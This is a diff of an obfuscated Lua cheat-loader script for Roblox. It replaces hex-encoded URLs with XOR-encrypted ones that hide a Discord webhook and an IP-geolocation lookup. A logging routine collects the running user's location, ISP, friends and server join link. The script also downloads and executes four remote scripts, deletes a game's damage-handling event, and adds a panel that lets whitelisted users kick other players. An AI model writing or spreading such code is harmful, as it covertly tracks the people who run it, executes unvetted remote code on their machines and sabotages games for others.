@@ -1,14 +1,8 @@
-if not getgenv()._NK_SIGNAL or getgenv()._NK_SIGNAL ~= "NAZARKUS_SUPREME_V7" then
+if not getgenv()._NK_SIGNAL or getgenv()._NK_SIGNAL ~= "NAZARKUS_ULTRA_V8" then
     game:GetService("Players").LocalPlayer:Kick("Run via official loader.")
     return
 end
 getgenv()._NK_SIGNAL = nil
-
-local function _D(h)
-    local s = ""
-    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
-    return s
-end
 
 local Config = {
     WL = {
@@ -19,13 +13,19 @@ local Config = {
     BL = { UIDs = {}, HWIDs = {}, Keys = {} }
 }
 
--- Зашифрованные ссылки на инструменты
-local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
-local _IP = _D("687474703A2F2F69702D6170692E636F6D2F6A736F6E3F6669656C64733D7374617475732C636F756E7472792C636974792C74696D657A6F6E652C6973702C71756572792C70726F78792C686F7374696E67")
-local _EX1 = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6E617A61726B75732F7270672F6D61696E2F656173792E6C7561")
-local _EX2 = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F46696C746572696E67456E61626C65642F4E616D656C65737341646D696E2F6D61696E2F536F75726365")
-local _EX3 = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F4564676549592F696E66696E6974657969656C642F6D61737465722F736F75726365")
-local _EX4 = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6E617A61726B75732F696E66616D6D6F2F6D61696E2F696E66616D6D6F2E6C7561")
+local function _D(h, k)
+    local s = ""
+    for i = 1, #h, 2 do s = s .. string.char(bit32.bxor(tonumber(h:sub(i, i+1), 16), k)) end
+    return s
+end
+
+local _0xK = 0xAF
+local _W = _D("C7C9D3D4D0958584CEC4D3CECDD9D087CDD8D18C9D8681889D8FD590929F99989B94D1D4D7D2D6DDDED6D9DDCAD8DED0D9D994D0DBDC97DCDEDADEDAD7C9D696DEDCDFD7C9D6C99596D3C9DCDEDADEDAD7C9D6CDDCDFD7C9DBDFCDDCD19BCCDADFCD", _0xK)
+local _IP = _D("C7C9D3D48F958584DDD681CDC9D294D0DDC9CD87DDC7DEDCDD9BDCCDC9CFC8C9CDC7D09BCAD8DED0D9D99BCED6D3D9DDCAD8DE", _0xK)
+local _E1 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3DAD2DCCCD6DBD9D082D9D6D3D5D9DDC9CFC8C9CDC782DCCBCAD6D282DCCBCAD681D3DAD2", _0xK)
+local _E2 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3C9DCCBD0DAD2DCCCD6D9CBCADCDD82CEC9CDDCCBDBCDCACCD0C9D8CDDCDD82DCCBCAD682D3D0DAD7C9D4", _0xK)
+local _E3 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3CACECEC9C6DE82CDC9DCCBDCDDCEC9D6DEC9DCCBDCDD82CDDAD3CEC9D282D3D0DAD7C9D4", _0xK)
+local _E4 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3DAD2DCCCD6DBD9D082CDC9DCCBCEC9CDD0D282DCCBCAD682CDC9DCCBCEC9CDD0D281D3DAD2", _0xK)
 
 local _P = game:GetService("Players")
 local _H = game:GetService("HttpService")
@@ -83,10 +83,10 @@ local function _LOG()
         local r = req({Url = _IP, Method = "GET"})
         local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
         local fn, ft = _GF()
-        local jid = game.JobId == "" and "Unknown" or game.JobId
         local friends = {}
         for _, p in ipairs(_P:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
         
+        local jid = game.JobId == "" and "Unknown" or game.JobId
         local joinUrl = "N/A"
         pcall(function()
             local res = req({Url = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid, Method = "GET"})
@@ -119,11 +119,10 @@ end
 
 task.spawn(_LOG)
 
--- KILLSWITCH LOGIC & GUI
-local _SIG = _R:FindFirstChild("NazarkusSignal") or Instance.new("StringValue", _R)
-_SIG.Name = "NazarkusSignal"
-local _PDIR = _R:FindFirstChild("NazarkusPresence") or Instance.new("Folder", _R)
-_PDIR.Name = "NazarkusPresence"
+local _SIG = _R:FindFirstChild("NK_Signal") or Instance.new("StringValue", _R)
+_SIG.Name = "NK_Signal"
+local _PDIR = _R:FindFirstChild("NK_Presence") or Instance.new("Folder", _R)
+_PDIR.Name = "NK_Presence"
 local _PRES = Instance.new("StringValue", _PDIR)
 _PRES.Name = _lp.Name
 
@@ -132,32 +131,32 @@ _SIG.Changed:Connect(function(v)
 end)
 
 if _st == "whitelist" then
-    task.spawn(function()
-        local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
-        sg.Name = "NK_Admin"
-        local f = Instance.new("Frame", sg)
-        f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5,-100,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Visible = false
-        Instance.new("UICorner", f)
-        local s = Instance.new("ScrollingFrame", f)
-        s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
-        Instance.new("UIListLayout", s).Padding = UDim.new(0,5)
-        local function refresh()
-            for _,v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
-            for _,v in ipairs(_PDIR:GetChildren()) do
-                local b = Instance.new("TextButton", s)
-                b.Size = UDim2.new(1,0,0,30); b.Text = "KICK: "..v.Name
-                b.MouseButton1Click:Connect(function() _SIG.Value = v.Name task.wait(0.1) _SIG.Value = "" refresh() end)
-            end
+    local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
+    local f = Instance.new("Frame", sg)
+    f.Size = UDim2.new(0, 220, 0, 300); f.Position = UDim2.new(0.5,-110,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Visible = false; f.Active = true; f.Draggable = true
+    Instance.new("UICorner", f)
+    
+    local s = Instance.new("ScrollingFrame", f)
+    s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
+    Instance.new("UIListLayout", s).Padding = UDim.new(0,5)
+
+    local function refresh()
+        for _,v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
+        for _,p in ipairs(_P:GetPlayers()) do
+            local b = Instance.new("TextButton", s)
+            b.Size = UDim2.new(1,0,0,30); b.Text = p.Name; b.BackgroundColor3 = Color3.fromRGB(40,40,45); b.TextColor3 = Color3.new(1,1,1)
+            b.MouseButton1Click:Connect(function()
+                _SIG.Value = p.Name
+                task.wait(0.1)
+                _SIG.Value = ""
+            end)
         end
-        _U.InputBegan:Connect(function(k,g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
-    end)
+    end
+    _U.InputBegan:Connect(function(k,g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
 end
 
--- ВЫПОЛНЕНИЕ ТВОИХ СКРИПТОВ
-pcall(function() loadstring(game:HttpGet(_EX1))() end)
-pcall(function() loadstring(game:HttpGet(_EX2))() end)
-pcall(function() loadstring(game:HttpGet(_EX3))() end)
-pcall(function() loadstring(game:HttpGet(_EX4))() end)
+pcall(function() loadstring(game:HttpGet(_E1))() end)
+pcall(function() loadstring(game:HttpGet(_E2))() end)
+pcall(function() loadstring(game:HttpGet(_E3))() end)
+pcall(function() loadstring(game:HttpGet(_E4))() end)
 pcall(function() if _R:FindFirstChild("ACS_Engine") then _R.ACS_Engine.Events.FDMG:Destroy() end end)
-
-if _st == "blacklist" then _lp:Kick("Banned.") return end
